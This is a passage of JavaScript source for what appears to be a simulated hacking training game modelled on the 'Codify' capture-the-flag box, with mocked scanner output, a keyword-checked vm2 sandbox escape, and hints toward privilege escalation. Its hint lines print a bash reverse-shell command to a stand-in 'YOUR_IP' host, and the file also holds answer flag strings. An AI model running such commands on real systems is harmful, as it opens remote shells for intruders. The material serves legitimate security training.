      print('|_http-title: Codify - Online Code Editor', 'success');
    } else {
      print('PORT     STATE SERVICE VERSION', 'info');
      print('22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)', 'system');
      if (hasScripts) {
        print('| ssh-hostkey:', 'muted');
        print('|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)', 'muted');
      }
      print('80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))', 'system');
      print('|_http-title: Codify', 'system');
      if (hasVersionScan) {
        print('|_http-server-header: Apache/2.4.52 (Ubuntu)', 'system');
      }
      print('3000/tcp open  http    Node.js Express framework', 'success');
      print('|_http-title: Codify - Online Code Editor', 'success');
      if (hasScripts) {
        print('| http-methods:', 'muted');
        print('|_  Supported Methods: GET HEAD POST OPTIONS', 'muted');
      }
    }

    print('', '');
    print('Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel', 'system');
    print('', '');
    print('Service detection performed. Nmap done: 1 IP address (1 host up)', 'muted');
    print('', '');
    print('[*] Port 3000 appears to be a web service (Node.js)', 'info');
    state.scanned = true;
    state.foundWeb = true;
    autosave();
    return;
  }

  // === GOBUSTER ===
  if (cmd === 'gobuster') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Gobuster v3.6 - Directory/File, DNS, VHost busting tool', 'info');
      print('', '');
      print('Usage:', 'warning');
      print('  gobuster [command]', 'system');
      print('', '');
      print('Available Commands:', 'info');
      print('  dir         Directory/file bruteforcing mode', 'system');
      print('  dns         DNS subdomain bruteforcing mode', 'system');
      print('  fuzz        Fuzzing mode', 'system');
      print('  vhost       Virtual host bruteforcing mode', 'system');
      print('', '');
      print('Dir Mode Flags:', 'info');
      print('  -u, --url string         Target URL (required)', 'success');
      print('  -w, --wordlist string    Path to wordlist (required)', 'success');
      print('  -t, --threads int        Number of threads (default 10)', 'system');
      print('  -x, --extensions string  File extensions to search (.php,.txt)', 'system');
      print('  -o, --output string      Output file to write results', 'system');
      print('  -r, --followredirect     Follow redirects', 'system');
      print('  -k, --insecuressl        Skip SSL cert verification', 'system');
      print('  -s, --status-codes       Status codes to match (default 200,204,301,302,307,401,403)', 'system');
      print('  -b, --excludestatuscode  Status codes to exclude', 'system');
      print('', '');
      print('Examples:', 'warning');
      print('  gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
      print('  gobuster dir -u http://target.htb -w wordlist.txt -x php,html -t 50', 'system');
      print('  gobuster vhost -u http://target.htb -w subdomains.txt', 'system');
      print('', '');
      return;
    }

    if (!state.scanned) {
      print('Maybe scan the target first?', 'warning');
      return;
    }

    // Validate required arguments
    const mode = args[0];
    if (!mode || !['dir', 'dns', 'vhost', 'fuzz'].includes(mode)) {
      print('Error: Must use "dir", "dns", "vhost", or "fuzz" subcommand', 'error');
      print('', '');
      print('Usage: gobuster dir -u <url> -w <wordlist>', 'system');
      print('       gobuster --help for full options', 'system');
      return;
    }

    const hasUrl = args.includes('-u') || args.includes('--url');
    const hasWordlist = args.includes('-w') || args.includes('--wordlist');

    if (!hasUrl) {
      print('Error: the required flag `-u, --url` was not specified', 'error');
      print('', '');
      print('Usage: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
      return;
    }

    if (!hasWordlist) {
      print('Error: the required flag `-w, --wordlist` was not specified', 'error');
      print('', '');
      print('Usage: gobuster dir -u http://codify.htb -w /usr/share/wordlists/dirb/common.txt', 'system');
      return;
    }

    // Get URL for target validation
    const urlIdx = args.indexOf('-u') !== -1 ? args.indexOf('-u') : args.indexOf('--url');
    const url = args[urlIdx + 1] || '';

    if (!url.includes('codify') && !url.includes('10.10.11.239')) {
      print('Error: Couldn\'t find host specified', 'error');
      return;
    }

    const threads = args.includes('-t') ? args[args.indexOf('-t') + 1] : '10';
    const wordlistIdx = args.indexOf('-w') !== -1 ? args.indexOf('-w') : args.indexOf('--wordlist');
    const wordlist = args[wordlistIdx + 1] || '/usr/share/wordlists/dirb/common.txt';

    await simulateLoading('Bruteforcing directories', 3500);
    print('');
    print('===============================================================', 'info');
    print('Gobuster v3.6', 'info');
    print('by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', 'muted');
    print('===============================================================', 'info');
    print(`[+] Url:                     ${url}`, 'system');
    print(`[+] Method:                  GET`, 'system');
    print(`[+] Threads:                 ${threads}`, 'system');
    print(`[+] Wordlist:                ${wordlist}`, 'system');
    print(`[+] Negative Status codes:   404`, 'system');
    print(`[+] User Agent:              gobuster/3.6`, 'system');
    print(`[+] Timeout:                 10s`, 'system');
    print('===============================================================', 'info');
    print('Starting gobuster in directory enumeration mode', 'info');
    print('===============================================================', 'info');
    print('/about               (Status: 200) [Size: 2921]', 'system');
    print('/editor              (Status: 200) [Size: 3123]', 'success');
    print('/limitations         (Status: 200) [Size: 2854]', 'system');
    print('Progress: 4614 / 4615 (99.98%)', 'muted');
    print('===============================================================', 'info');
    print('Finished', 'info');
    print('===============================================================', 'info');
    print('');
    print('[*] Found /editor endpoint - investigate further', 'info');
    state.foundEditor = true;
    autosave();
    return;
  }

  // === FFUF ===
  if (cmd === 'ffuf') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Fuzz Faster U Fool - v2.1.0', 'info');
      print('', '');
      print('HTTP OPTIONS:', 'warning');
      print('  -u, --url            Target URL (use FUZZ keyword)', 'success');
      print('  -w, --wordlist       Wordlist file path', 'success');
      print('  -X, --method         HTTP method to use (default: GET)', 'system');
      print('  -d, --data           POST data', 'system');
      print('  -H, --header         Header "Name: Value" (multiple)', 'system');
      print('  -b, --cookie         Cookie data "name=value"', 'system');
      print('', '');
      print('MATCHING OPTIONS:', 'warning');
      print('  -mc                  Match HTTP status codes (default: 200,204,301,302,307,401,403,405)', 'system');
      print('  -ml                  Match amount of lines in response', 'system');
      print('  -mr                  Match regexp', 'system');
      print('  -ms                  Match HTTP response size', 'system');
      print('  -mw                  Match amount of words in response', 'system');
      print('', '');
      print('FILTER OPTIONS:', 'warning');
      print('  -fc                  Filter HTTP status codes', 'system');
      print('  -fl                  Filter by line count', 'system');
      print('  -fr                  Filter regexp', 'system');
      print('  -fs                  Filter HTTP response size', 'system');
      print('  -fw                  Filter by word count', 'system');
      print('', '');
      print('GENERAL OPTIONS:', 'warning');
      print('  -t, --threads        Number of concurrent threads (default: 40)', 'system');
      print('  -p                   Seconds of delay between requests', 'system');
      print('  -o, --output         Output file', 'system');
      print('  -of                  Output format (json, csv, html)', 'system');
      print('  -recursion           Scan recursively', 'system');
      print('  -e                   Extensions (.php,.html,.txt)', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
      print('  ffuf -u http://target.htb/FUZZ -w wordlist.txt -mc 200 -fc 404', 'system');
      print('  ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w subdomains.txt', 'system');
      print('', '');
      return;
    }

    if (!state.scanned) {
      print('Maybe scan the target first?', 'warning');
      return;
    }

    // Validate required arguments
    const hasUrl = args.includes('-u');
    const hasWordlist = args.includes('-w');

    if (!hasUrl) {
      print('Error: -u flag required', 'error');
      print('', '');
      print('Usage: ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
      print('       ffuf --help for full options', 'system');
      return;
    }

    if (!hasWordlist) {
      print('Error: -w flag required', 'error');
      print('', '');
      print('Usage: ffuf -u http://target.htb/FUZZ -w wordlist.txt', 'system');
      return;
    }

    const urlIdx = args.indexOf('-u');
    const url = args[urlIdx + 1] || '';

    if (!url.includes('FUZZ')) {
      print('Error: No FUZZ keyword found in URL', 'error');
      print('', '');
      print('Example: ffuf -u http://codify.htb/FUZZ -w wordlist.txt', 'system');
      return;
    }

    await simulateLoading('Fuzzing', 3000);
    print('', '');
    print("        /'___\\  /'___\\           /'___\\", 'info');
    print("       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/", 'info');
    print("       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\", 'info');
    print("        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/", 'info');
    print("         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\", 'info');
    print("          \\/_/    \\/_/   \\/___/    \\/_/", 'info');
    print('', '');
    print('       v2.1.0', 'muted');
    print('________________________________________________', 'muted');
    print('', '');
    print(' :: Method           : GET', 'system');
    print(' :: URL              : ' + url, 'system');
    print(' :: Wordlist         : FUZZ: wordlist.txt', 'system');
    print(' :: Follow redirects : false', 'system');
    print(' :: Calibration      : false', 'system');
    print(' :: Timeout          : 10', 'system');
    print(' :: Threads          : 40', 'system');
    print('________________________________________________', 'muted');
    print('', '');
    print('about                   [Status: 200, Size: 2921, Words: 645, Lines: 67]', 'system');
    print('editor                  [Status: 200, Size: 3123, Words: 789, Lines: 82]', 'success');
    print('limitations             [Status: 200, Size: 2854, Words: 612, Lines: 59]', 'system');
    print('', '');
    print(':: Progress: [4614/4614] :: Job [1/1] :: 892 req/sec :: Duration: [0:00:05] :: Errors: 0 ::', 'muted');
    print('');
    print('[*] Found /editor endpoint', 'info');
    state.foundEditor = true;
    autosave();
    return;
  }

  // === FEROXBUSTER ===
  if (cmd === 'feroxbuster') {
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('feroxbuster 2.10.0 - A fast, simple, recursive content discovery tool', 'info');
      print('', '');
      print('USAGE:', 'warning');
      print('    feroxbuster [OPTIONS]', 'system');
      print('', '');
      print('OPTIONS:', 'info');
      print('    -u, --url <URL>           Target URL (required)', 'success');
      print('    -w, --wordlist <FILE>     Path to wordlist', 'success');
      print('    -t, --threads <THREADS>   Number of threads (default: 50)', 'system');
      print('    -d, --depth <DEPTH>       Recursion depth (default: 4)', 'system');
      print('    -x, --extensions <EXT>    Extensions to search (.php,.html)', 'system');
      print('    -s, --status-codes        Status codes to include', 'system');
      print('    -C, --filter-status       Status codes to exclude', 'system');
      print('    -o, --output <FILE>       Output file', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('    feroxbuster -u http://target.htb -w wordlist.txt', 'system');
      print('    feroxbuster -u http://target.htb -w wordlist.txt -x php,html -d 2', 'system');
      print('', '');
      return;
    }

    if (!state.scanned) {
      print('Maybe scan the target first?', 'warning');
      return;
    }

    const hasUrl = args.includes('-u') || args.includes('--url');
    if (!hasUrl) {
      print('Error: -u/--url flag required', 'error');
      print('Usage: feroxbuster -u http://target.htb -w wordlist.txt', 'system');
      return;
    }

    await simulateLoading('Scanning directories', 3500);
    print('', '');
    print(' ___  ___  __   __     __      __         __   ___', 'warning');
    print('|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__', 'warning');
    print('|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___', 'warning');
    print('by Ben "epi" Risher                    ver: 2.10.0', 'muted');
    print('───────────────────────────┬──────────────────────', 'muted');
    print(' [>] Target Url            │ http://codify.htb', 'system');
    print(' [>] Threads               │ 50', 'system');
    print(' [>] Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt', 'system');
    print('───────────────────────────┴──────────────────────', 'muted');
    print('', '');
    print('200      GET       67l      645w     2921c http://codify.htb/about', 'system');
    print('200      GET       82l      789w     3123c http://codify.htb/editor', 'success');
    print('200      GET       59l      612w     2854c http://codify.htb/limitations', 'system');
    print('', '');
    print('[*] Found /editor endpoint', 'info');
    state.foundEditor = true;
    autosave();
    return;
  }

  // === CURL ===
  if (cmd === 'curl') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('curl 8.1.2 - command line tool for transferring data with URLs', 'info');
      print('', '');
      print('Usage: curl [options...] <url>', 'system');
      print('', '');
      print('HTTP OPTIONS:', 'warning');
      print('  -X, --request <method>  HTTP method (GET, POST, PUT, DELETE)', 'system');
      print('  -d, --data <data>       HTTP POST data', 'system');
      print('  -H, --header <header>   Pass custom header(s)', 'system');
      print('  -b, --cookie <data>     Send cookies from string "name=value"', 'system');
      print('  -c, --cookie-jar <file> Write cookies to file after operation', 'system');
      print('  -u, --user <user:pass>  Server user and password', 'system');
      print('  -A, --user-agent <name> Send User-Agent header', 'system');
      print('  -L, --location          Follow redirects', 'system');
      print('  -k, --insecure          Allow insecure SSL connections', 'system');
      print('  -I, --head              Show headers only', 'system');
      print('  -v, --verbose           Verbose output', 'system');
      print('  -s, --silent            Silent mode', 'system');
      print('  -o, --output <file>     Write output to file', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  curl http://target.htb', 'system');
      print('  curl -X POST -d "user=admin&pass=123" http://target.htb/login', 'system');
      print('  curl -H "Authorization: Bearer TOKEN" http://target.htb/api', 'system');
      print('  curl -b "session=abc123" http://target.htb/dashboard', 'system');
      print('', '');
      return;
    }

    if (!args[0]) {
      print('curl: no URL specified', 'error');
      print('curl: try \'curl --help\' for more information', 'system');
      return;
    }

    const url = args.find(a => a.startsWith('http')) || args[0];
    
    // Check if this is a POST request to /editor
    const isPostToEditor = (url.includes('editor') || url.includes(':3000')) && 
                          (args.includes('-X') && args.includes('POST') || args.includes('--data') || args.includes('-d'));
    
    if (isPostToEditor) {
      // Will be handled by the POST handler below - skip GET response
      // (fall through to POST handler)
    } else if (url.includes('editor') || url.includes(':3000')) {
      // GET request - show the editor page
      print('<!DOCTYPE html>', 'system');
      print('<html lang="en">', 'system');
      print('<head>', 'system');
      print('  <meta charset="UTF-8">', 'system');
      print('  <meta name="viewport" content="width=device-width, initial-scale=1.0">', 'system');
      print('  <title>Codify - Online Code Editor</title>', 'system');
      print('  <link rel="stylesheet" href="/static/style.css">', 'system');
      print('</head>', 'system');
      print('<body>', 'system');
      print('  <div class="container">', 'system');
      print('    <h1>Codify</h1>', 'system');
      print('    <p class="subtitle">Test your Node.js code safely</p>', 'system');
      print('    <form method="POST" action="/editor" id="codeForm">', 'system');
      print('      <textarea name="code" id="code" placeholder="Enter your Node.js code here..."></textarea>', 'system');
      print('      <button type="submit">Run Code</button>', 'system');
      print('    </form>', 'system');
      print('    <div id="output"></div>', 'system');
      print('  </div>', 'system');
      print('  <script src="/static/editor.js"><\/script>', 'system');
      print('</body>', 'system');
      print('</html>', 'system');
      print('');
      print('[*] Found code editor at /editor', 'info');
      state.foundEditor = true;
      return;
    }

    if (url.includes('limitations')) {
      // More realistic limitations page - version info is there but not highlighted
      print('<!DOCTYPE html>', 'system');
      print('<html>', 'system');
      print('<head><title>Limitations - Codify</title></head>', 'system');
      print('<body>', 'system');
      print('  <h2>Sandbox Limitations</h2>', 'system');
      print('  <p>For security reasons, the following are restricted:</p>', 'system');
      print('  <ul>', 'system');
      print('    <li>File system access (fs module)</li>', 'system');
      print('    <li>Child process execution (child_process module)</li>', 'system');
      print('    <li>Network access (net, http modules)</li>', 'system');
      print('    <li>OS-level operations (os module)</li>', 'system');
      print('  </ul>', 'system');
      print('  <p><small>Powered by vm2 v3.9.16</small></p>', 'system');
      print('  <p><a href="/editor">Back to Editor</a></p>', 'system');
      print('</body>', 'system');
      print('</html>', 'system');
      print('');
      print('[*] Version information found: vm2 v3.9.16', 'info');
      addEasterEgg('lvl1_version', 'Version enumeration master!');
      return;
    }

    print('<html><body>Codify - Test your code securely!</body></html>', 'system');
    return;
  }

  // === CURL POST to /editor (Sandbox escape via CVE-2023-30547) ===
  // Handle POST requests to /editor separately (sandbox escape)
  if (cmd === 'curl') {
    const url = args.find(a => a.startsWith('http')) || args[0];
    const isPostToEditor = url && (url.includes('editor') || url.includes(':3000')) && 
                          (args.includes('-X') && args.includes('POST') || args.includes('--data') || args.includes('-d'));
    
    if (isPostToEditor) {
      if (!state.foundEditor) {
        print('Find the code editor first!', 'warning');
        return;
      }

      // Extract code from POST data
    let codePayload = '';
    const dataIdx = args.findIndex(a => a === '-d' || a === '--data');
    if (dataIdx !== -1 && args[dataIdx + 1]) {
      const dataStr = args[dataIdx + 1];
      // Handle URL-encoded or JSON
      if (dataStr.includes('code=')) {
        codePayload = decodeURIComponent(dataStr.split('code=')[1].split('&')[0]);
      } else if (dataStr.includes('"code"') || dataStr.includes("'code'")) {
        // JSON format
        const match = dataStr.match(/["']code["']\s*:\s*["']([^"']+)["']/);
        if (match) codePayload = match[1];
      } else {
        // Assume raw code
        codePayload = dataStr.replace(/^["']|["']$/g, '');
      }
    }

      state.triedPayloads++;

      // Check for vm2 sandbox escape (CVE-2023-30547)
      // Realistic check: looks for Error.prototype manipulation + Proxy + process access
      const hasErrorProto = codePayload.includes('Error') && (codePayload.includes('prototype') || codePayload.includes('name'));
      const hasProxy = codePayload.includes('Proxy') || codePayload.includes('getPrototypeOf');
      const hasProcess = codePayload.includes('process') || codePayload.includes('execSync') || codePayload.includes('exec');
      const hasVM2 = codePayload.includes('vm2') || codePayload.includes('VM');

      if (hasErrorProto && hasProxy && hasProcess) {
        print('HTTP/1.1 200 OK', 'system');
        print('Content-Type: application/json', 'system');
        print('', 'system');
        print('{"output":"uid=1001(svc) gid=1001(svc) groups=1001(svc)\\n"}', 'success');
        print('');
        print('[+] Sandbox escape successful! Code executed outside sandbox.', 'success');
        print('[+] Now we can execute commands. Setting up reverse shell...', 'info');
        await sleep(1500);
        
        // Check if they're trying to get a reverse shell
        if (codePayload.includes('bash') || codePayload.includes('nc ') || codePayload.includes('socket')) {
          print('[+] Reverse shell established!', 'success');
          print('[+] Connected to codify as user svc', 'success');
          print('');
          prompt.textContent = 'svc@codify:~$';
          state.gotShell = true;
          state.shellUser = 'svc';
          state.currentDir = '/home/svc';
          playSuccess();
          autosave();
          return;
        } else {
          print('[*] Tip: Modify payload to get reverse shell: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1', 'info');
          print('[*] Or use: require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\'")', 'system');
          return;
        }
      }

      // Wrong payload attempts
      if (codePayload.includes('require(') && !hasVM2 && !hasProxy) {
        print('HTTP/1.1 200 OK', 'system');
        print('Content-Type: application/json', 'system');
        print('', 'system');
        print('{"error":"ReferenceError: require is not defined"}', 'error');
        print('');
        print('[*] The sandbox restricts require(). Need to escape vm2 first.', 'warning');
        return;
      }

      if (codePayload.includes('eval(') || codePayload.includes('Function(')) {
        print('HTTP/1.1 200 OK', 'system');
        print('Content-Type: application/json', 'system');
        print('', 'system');
        print('{"error":"SecurityError: eval and Function are disabled in sandbox"}', 'error');
        print('');
        print('[*] Direct eval/Function calls are blocked. Research vm2 escape techniques.', 'warning');
        return;
      }

      // Generic execution but no escape
      print('HTTP/1.1 200 OK', 'system');
      print('Content-Type: application/json', 'system');
      print('', 'system');
      print('{"output":"Code executed in sandbox (no output)"}', 'system');
      print('');
      print('[*] Code executed but still inside sandbox. Research CVE-2023-30547.', 'warning');
      return;
    }
    // End of POST to editor handler - continue to other curl handlers if not POST to editor
  }

  // === SHELL COMMANDS (only after getting shell) ===
  if (!state.gotShell) {
    if (['ls', 'cat', 'cd', 'pwd', 'id', 'whoami', 'find', 'grep', 'sudo', 'su', 'linpeas', 'pspy'].includes(cmd)) {
      print('You need a shell on the target first!', 'error');
      return;
    }
  }

  // === ID ===
  if (cmd === 'id') {
    if (state.gotRoot) {
      print('uid=0(root) gid=0(root) groups=0(root)', 'success');
    } else if (state.crackedPassword && state.shellUser === 'joshua') {
      print('uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)', 'system');
    } else {
      print('uid=1001(svc) gid=1001(svc) groups=1001(svc)', 'system');
    }
    return;
  }

  // === WHOAMI ===
  if (cmd === 'whoami') {
    if (state.gotRoot) {
      print('root', 'success');
    } else if (state.crackedPassword && state.shellUser === 'joshua') {
      print('joshua', 'system');
    } else {
      print('svc', 'system');
    }
    return;
  }

  // === PWD ===
  if (cmd === 'pwd') {
    print(state.currentDir, 'system');
    return;
  }

  // === CD ===
  if (cmd === 'cd') {
    const dir = args[0] || '/home/' + state.shellUser;
    if (dir === '~') {
      state.currentDir = '/home/' + state.shellUser;
    } else if (dir === '..') {
      state.currentDir = state.currentDir.split('/').slice(0, -1).join('/') || '/';
    } else if (dir.startsWith('/')) {
      state.currentDir = dir;
    } else {
      state.currentDir = state.currentDir + '/' + dir;
    }
    prompt.textContent = `${state.gotRoot ? 'root' : state.shellUser}@codify:${state.currentDir.replace('/home/' + state.shellUser, '~')}$`;
    return;
  }

  // === LS ===
  if (cmd === 'ls') {
    const showAll = args.includes('-la') || args.includes('-a');
    const path = args.find(a => !a.startsWith('-')) || state.currentDir;

    if (path.includes('/var/www') || state.currentDir.includes('/var/www')) {
      print('drwxr-xr-x  5 root root 4096 Sep 12 17:40 .', 'system');
      print('drwxr-xr-x 14 root root 4096 Sep 12 17:40 ..', 'system');
      print('drwxr-xr-x  3 svc  svc  4096 Sep 12 17:40 contact', 'system');
      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 editor', 'system');
      print('-rw-r--r--  1 svc  svc  4377 Apr 12  2023 index.js', 'system');
      print('-rw-r--r--  1 svc  svc   298 Apr 12  2023 package.json', 'system');
      print('drwxr-xr-x  2 svc  svc  4096 Sep 12 17:40 tickets', 'system');
      if (!state.foundTickets) {
        print('');
        print('[*] Found /var/www/contact/tickets directory', 'info');
        state.foundTickets = true;
      }
      return;
    }

    if (path.includes('tickets') || state.currentDir.includes('tickets')) {
      print('-rw-r--r-- 1 svc svc 20480 Sep 12 17:40 tickets.db', 'system');
      if (!state.foundDb) {
        print('');
        print('[*] Found SQLite database: tickets.db', 'info');
        state.foundDb = true;
      }
      return;
    }

    if (path.includes('/home/joshua') || (state.shellUser === 'joshua' && state.currentDir.includes('joshua'))) {
      print('drwxr-xr-x 4 joshua joshua 4096 Sep 14 14:44 .', 'system');
      print('drwxr-xr-x 4 root   root   4096 Sep 12 17:40 ..', 'system');
      print('-rw-r----- 1 joshua joshua   33 Sep 14 14:44 user.txt', 'success');
      print('-rw-r--r-- 1 joshua joshua  220 Sep 12 17:40 .bash_logout', 'system');
      print('-rw-r--r-- 1 joshua joshua 3771 Sep 12 17:40 .bashrc', 'system');
      return;
    }

    if (path.includes('/opt') || state.currentDir.includes('/opt')) {
      print('drwxr-xr-x  2 root root 4096 Sep 12 17:40 .', 'system');
      print('drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..', 'system');
      print('-rwxr-xr-x  1 root root  928 Sep 12 17:40 mysql-backup.sh', 'success');
      state.foundScript = true;
      print('');
      print('[!] Found backup script: /opt/mysql-backup.sh', 'success');
      return;
    }

    if (path === '/root' && state.gotRoot) {
      print('-rw-r--r-- 1 root root   33 Sep 14 14:44 root.txt', 'success');
      return;
    }

    // Default home directory
    print('.bashrc  .profile  .cache', 'system');
    return;
  }

  // === CAT ===
  if (cmd === 'cat') {
    if (!args[0]) {
      print('Usage: cat <file>', 'error');
      return;
    }

    if (args[0].includes('user.txt')) {
    if (state.shellUser !== 'joshua' && !state.gotRoot) {
      print('cat: user.txt: Permission denied', 'error');
      print('[*] File is readable only by joshua user', 'info');
      return;
    }
    print('HTB{v1rtu4l_m4ch1n3_3sc4p3_m4st3r}', 'success');
    if (!state.userFlag) {
      state.userFlag = true;
      playSuccess();
      print('');
      print('[+] USER FLAG CAPTURED!', 'success');
      autosave();
    }
    return;
    }

    if (args[0].includes('root.txt')) {
    if (!state.gotRoot) {
      print('cat: root.txt: Permission denied', 'error');
      print('[*] File is readable only by root', 'info');
      return;
    }
    print('HTB{pr1v3sc_v14_b4sh_p4tt3rn_m4tch1ng}', 'success');
    if (!state.rootFlag) {
      state.rootFlag = true;
      playSuccess();
      print('');
      print('[+] ROOT FLAG CAPTURED!', 'success');
      print('');
      completeLevel();
    }
    return;
    }

    if (args[0].includes('mysql-backup.sh')) {
      print('#!/bin/bash', 'system');
      print('# MySQL Backup Script', 'system');
      print('# Created: 2023-09-12', 'system');
      print('', 'system');
      print('DB_USER="root"', 'system');
      print('DB_PASS=$(/usr/bin/cat /root/.creds)', 'system');
      print('BACKUP_DIR="/var/backups/mysql"', 'system');
      print('', 'system');
      print('if [ ! -d "$BACKUP_DIR" ]; then', 'system');
      print('    mkdir -p "$BACKUP_DIR"', 'system');
      print('fi', 'system');
      print('', 'system');
      print('read -s -p "Enter MySQL password for $DB_USER: " USER_PASS', 'system');
      print('echo', 'system');
      print('', 'system');
      print('if [[ $USER_PASS == $DB_PASS ]]; then', 'system');
      print('    /usr/bin/mysqldump --all-databases -u "$DB_USER" -p"$DB_PASS" > "$BACKUP_DIR/backup.sql"', 'system');
      print('    echo "Backup completed successfully!"', 'system');
      print('else', 'system');
      print('    echo "Password incorrect!"', 'system');
      print('    exit 1', 'system');
      print('fi', 'system');
      print('');
      print('[*] Script reads password from /root/.creds', 'info');
      print('[*] Uses bash [[ ]] for comparison - research bash pattern matching', 'info');
      state.analyzedScript = true;
      addEasterEgg('lvl1_bashvuln', 'Bash pattern matching exploit found!');
      return;
    }

    // Add package.json reading
    if (args[0].includes('package.json')) {
      print('{', 'system');
      print('  "name": "codify",', 'system');
      print('  "version": "1.0.0",', 'system');
      print('  "description": "Online code editor with sandbox",', 'system');
      print('  "main": "index.js",', 'system');
      print('  "dependencies": {', 'system');
      print('    "express": "^4.18.2",', 'system');
      print('    "vm2": "^3.9.16"', 'system');
      print('  }', 'system');
      print('}', 'system');
      print('');
      print('[*] Application uses vm2 v3.9.16', 'info');
      return;
    }

    print('cat: ' + args[0] + ': No such file or directory', 'error');
    return;
  }

  // === FIND ===
  if (cmd === 'find') {
    // Handle --help
    if (args.includes('--help') || args.includes('-h')) {
      print('', '');
      print('Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]', 'system');
      print('', '');
      print('TESTS (commonly used):', 'warning');
      print('  -name <pattern>     File name matches shell pattern', 'system');
      print('  -iname <pattern>    Like -name but case insensitive', 'system');
      print('  -type <c>           File type (f=regular, d=directory, l=symlink)', 'system');
      print('  -perm <mode>        Permissions match mode', 'system');
      print('  -user <name>        File is owned by user', 'system');
      print('  -group <name>       File is owned by group', 'system');
      print('  -size <n>           File uses n units of space', 'system');
      print('  -mtime <n>          Modified n days ago', 'system');
      print('  -newer <file>       Modified more recently than file', 'system');
      print('', '');
      print('ACTIONS:', 'warning');
      print('  -print              Print file name (default)', 'system');
      print('  -exec <cmd> {} \\;   Execute command on each file', 'system');
      print('  -delete             Delete files', 'system');
      print('', '');
      print('EXAMPLES:', 'warning');
      print('  find / -name "*.db" 2>/dev/null', 'success');
      print('  find / -perm -4000 2>/dev/null              # SUID files', 'success');
      print('  find / -user root -perm -4000 2>/dev/null   # Root SUID files', 'system');
      print('  find /var -type f -name "*.conf"', 'system');
      print('  find / -writable -type d 2>/dev/null        # Writable directories', 'system');
      print('', '');
      return;
    }

    if (!args[0]) {
      print('find: missing argument to search path', 'error');
      print('', '');
      print('Usage: find <path> [expression]', 'system');
      print('Example: find / -name "*.db" 2>/dev/null', 'info');
      print('         find --help for more options', 'system');
      return;
    }

    const pattern = args.join(' ');

    if (pattern.includes('*.db') || pattern.includes('.db') || pattern.includes('-name')) {
      await simulateLoading('Searching', 1500);
      print('/var/www/contact/tickets/tickets.db', 'success');
      state.foundDb = true;
      return;
    }

    if (pattern.includes('perm') || pattern.includes('suid') || pattern.includes('4000')) {
      await simulateLoading('Searching for SUID binaries', 2000);
      print('/usr/bin/sudo', 'system');
      print('/usr/bin/passwd', 'system');
      print('/usr/bin/chfn', 'system');
      print('/usr/bin/mount', 'system');
      print('/usr/bin/umount', 'system');
      print('/usr/bin/gpasswd', 'system');
      print('/usr/bin/newgrp', 'system');
      print('/usr/bin/su', 'system');
      print('/usr/lib/openssh/ssh-keysign', 'system');
      print('/usr/lib/dbus-1.0/dbus-daemon-launch-helper', 'system');
      print('');
      print('[*] No unusual SUID binaries found. Standard Ubuntu set.', 'info');
      return;
    }

    if (pattern.includes('writable') || pattern.includes('-w')) {
      await simulateLoading('Searching for writable files', 1500);
      print('/tmp', 'system');
      print('/var/tmp', 'system');
      print('/dev/shm', 'system');
      print('');
      print('[*] Standard writable directories only', 'info');
      return;
    }

    print('find: ' + pattern.split(' ')[0] + ': No such file or directory', 'error');
    return;
  }

  // === SQLITE3 ===
  if (cmd === 'sqlite3') {
    // Handle --help
    if (args.includes('--help') || args.includes('-help')) {
      print('', '');
      print('sqlite3 - A command line interface for SQLite version 3.x', 'info');
      print('', '');
      print('Usage: sqlite3 [OPTIONS] FILENAME [SQL]', 'system');
      print('', '');
      print('OPTIONS:', 'warning');
      print('  -bail               Stop after hitting an error', 'system');
      print('  -batch              Force batch I/O', 'system');
      print('  -column             Set output mode to column', 'system');
      print('  -cmd COMMAND        Run COMMAND before reading stdin', 'system');
      print('  -csv                Set output mode to csv', 'system');
      print('  -header             Turn headers on', 'system');
      print('  -html               Set output mode to HTML', 'system');
      print('  -line               Set output mode to line', 'system');
      print('  -list               Set output mode to list', 'system');
      print('  -separator SEP      Set output column separator', 'system');
      print('', '');
      print('DOT COMMANDS (inside sqlite3):', 'warning');
      print('  .tables             List names of tables', 'success');
      print('  .schema             Show CREATE statements', 'system');
      print('  .headers on|off     Turn display of headers on/off', 'system');
      print('  .mode column|csv    Set output mode', 'system');
      print('  .dump               Dump database as SQL', 'system');
      print('  .quit               Exit sqlite3', 'system');
      print('', '');
      print('EXAMPLE:', 'warning');
      print('  sqlite3 tickets.db ".tables"', 'system');
      print('  sqlite3 tickets.db "SELECT * FROM users;"', 'success');
      print('', '');
      return;
    }

    if (!state.foundDb) {
      print('No database file found yet. Enumerate first!', 'warning');
      return;
    }

    print('SQLite version 3.37.2', 'info');
    print('');
    print('sqlite> .tables', 'system');
